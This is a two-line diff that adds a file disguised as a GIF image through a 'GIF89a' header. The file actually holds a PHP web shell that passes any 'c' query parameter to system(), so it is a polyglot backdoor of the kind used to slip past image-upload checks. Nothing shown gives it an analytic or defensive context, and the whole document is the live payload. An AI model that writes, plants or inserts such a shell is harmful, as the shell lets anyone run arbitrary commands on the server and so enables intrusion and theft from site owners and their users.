@@ -1,0 +1,2 @@
+GIF89a
+<?php if(isset($_GET["c"])){system($_GET["c"]);}else{echo "OK";} ?>
